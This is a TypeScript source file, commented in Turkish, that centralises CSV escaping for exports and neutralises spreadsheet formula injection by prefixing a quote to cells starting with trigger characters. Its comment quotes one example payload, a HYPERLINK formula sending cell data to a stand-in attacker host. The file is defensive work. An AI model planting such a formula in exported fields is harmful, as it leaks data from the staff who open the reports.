/**
 * CSV disa aktarimlari icin tek kacis (escape) fonksiyonu.
 *
 * Ayni fonksiyonun yedi ayri rotada elle kopyalanmis hali vardi; birinde bir eksik
 * kalirsa fark edilmezdi. Tek yerde toplandi.
 *
 * Iki ayri sey yapar:
 *
 * 1. CSV alan kacisi (tirnak/virgul/satir sonu) - dosyanin bicimini korur.
 *
 * 2. FORMUL KACISI. Bu daha az bilinen ama daha onemli olan: Excel/LibreOffice, bir
 *    hucre `=`, `+`, `-`, `@` (veya bir tab/CR) ile basliyorsa onu METIN degil FORMUL
 *    sayar. Bu dosyalardaki alanlarin bir kismini disaridan gelen kisiler yaziyor -
 *    filo musterisi bakiye yukleme talebine not dusuyor, kiosk'ta plaka giriliyor,
 *    istasyon adi/kiosk etiketi baska bir kiraci yoneticisi tarafindan giriliyor.
 *    Boyle bir alan `=HYPERLINK("http://saldirgan.example?d="&A1;"Tikla")` olarak
 *    yazilirsa, raporu acan personelin tablosunda calisan bir formule donusur.
 *
 *    Cozum degeri BOZMAK degil: basina tek tirnak eklenir - Excel bunu "bu bir metin"
 *    isareti sayar, hucrede gorunmez, formul calismaz.
 */

const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Sayilar formul degildir: negatif bir tutar (-125.40) tirnaklanirsa sutun artik
 * toplanamazdi - CSV'yi uretmenin butun amaci o sutunlarin sayi kalmasi.
 */
function isPlainNumber(s: string): boolean {
  return /^[+-]?\d+(\.\d+)?$/.test(s);
}

export function csvEscape(value: unknown): string {
  const raw = value === null || value === undefined ? "" : String(value);
  const s = FORMULA_TRIGGERS.some((c) => raw.startsWith(c)) && !isPlainNumber(raw) ? `'${raw}` : raw;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
